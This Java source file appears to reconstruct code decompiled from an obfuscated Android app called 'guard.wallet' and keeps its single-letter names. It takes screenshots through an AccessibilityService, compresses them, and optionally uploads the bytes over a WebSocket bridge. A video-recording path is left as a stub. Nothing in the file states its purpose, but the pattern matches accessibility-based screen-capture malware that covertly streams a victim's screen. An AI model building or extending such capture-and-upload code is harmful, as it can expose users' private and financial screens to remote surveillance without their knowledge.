package com.guard.wallet.capture;

/**
 * 截屏回调 + 视频录制画质控制器 -- takeScreenshot() 回调状态持有者。
 * 恢复 API 30+ 截屏状态机 (o/r -> thread/k) 并为 VideoRecordManager 提供画质参数。
 *
 * vendor 原始路径: u/a.java
 */

import com.guard.wallet.core.AppUtils;
import android.accessibilityservice.AccessibilityService.ScreenshotResult;
import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback;
import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.hardware.HardwareBuffer;
import android.util.Log;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.SystemHelper;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public class ScreenshotCallback implements TakeScreenshotCallback {

    /** screenshot state: -1 idle, 0 running, 1 finished, 2 failed */
    public final AtomicInteger a = new AtomicInteger(-1);
    /** upload screenshot bytes to WebSocket bridge */
    public final AtomicBoolean b;
    /** live-record path flag; full vendor recording path is not yet ported */
    public final AtomicBoolean c;
    /** compressed screenshot bytes */
    public byte[] d;
    /** compress scale */
    public Float e;
    /** compress quality */
    public Integer f;

    public ScreenshotCallback(Float scale) {
        this(scale, false, false, null);
    }

    public ScreenshotCallback(Float scale, Integer quality) {
        this(scale, false, true, quality);
    }

    public ScreenshotCallback(boolean upload) {
        this(a(), upload, false, null);
    }

    private ScreenshotCallback(Float scale, boolean upload, boolean recordMode, Integer quality) {
        this.b = new AtomicBoolean(false);
        this.c = new AtomicBoolean(false);
        this.b.set(upload);
        this.c.set(recordMode);

        float normalizedScale = scale != null ? scale : 0.0f;
        if (normalizedScale <= 0.0f || normalizedScale > 1.0f) {
            normalizedScale = a();
        }
        this.e = normalizedScale;

        if (quality != null && quality > 0 && quality <= 100) {
            this.f = quality;
        } else {
            this.f = (int) (normalizedScale * 100.0f);
        }
    }

    public static float a() {
        ScreenMetricsVO metrics = com.guard.wallet.utils.DeviceUtils.buildScreenMetrics();
        if (metrics.getWidth() != null && metrics.getWidth() > 0
                && metrics.getHeight() != null && metrics.getHeight() > 0) {
            int max = Math.max(metrics.getWidth(), metrics.getHeight());
            return 800.0f / (float) max;
        }
        return 0.25f;
    }

    public boolean b() {
        int state = this.a.get();
        return state == -1 || state == 1 || state == 2;
    }

    public final void c(Bitmap bitmap) {
        if (bitmap == null) {
            return;
        }

        if (this.c.get()) {
            // VideoRecordManager chain is still stubbed in replica; keep state machine intact.
            SystemHelper.J0(bitmap);
            return;
        }

        byte[] bytes = SystemHelper.M0(SystemHelper.y(bitmap), this.e, this.f);
        if (this.b.get()) {
            MyAccessibilityService service = MyAccessibilityService.P();
            if (service != null) {
                MyAccessibilityService.a0(bytes);
            }
        }
        this.d = bytes;
        SystemHelper.J0(bitmap);
    }

    @Override
    public void onFailure(int errorCode) {
        this.a.set(2);
    }

    @Override
    public void onSuccess(ScreenshotResult result) {
        Log.d("CustomTakeScreenshotCallback", "AccessibilityService Screen Shot Success");
        this.a.set(0);
        try {
            Bitmap bitmap = d(result);
            if (bitmap != null) {
                c(bitmap);
            }
        } catch (Exception ex) {
            AppUtils.s("CustomTakeScreenshotCallback", ex);
        }
        this.a.set(1);
    }

    private static Bitmap d(ScreenshotResult result) {
        if (result == null) {
            return null;
        }

        HardwareBuffer buffer = null;
        Bitmap wrapped = null;
        try {
            buffer = result.getHardwareBuffer();
            if (buffer == null) {
                return null;
            }

            ColorSpace colorSpace = result.getColorSpace();
            wrapped = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
            if (wrapped == null) {
                return null;
            }

            Bitmap copy = wrapped.copy(Bitmap.Config.ARGB_8888, false);
            if (copy == null) {
                copy = Bitmap.createBitmap(wrapped);
            }
            return copy;
        } finally {
            if (wrapped != null) {
                wrapped.recycle();
            }
            if (buffer != null) {
                buffer.close();
            }
        }
    }
}
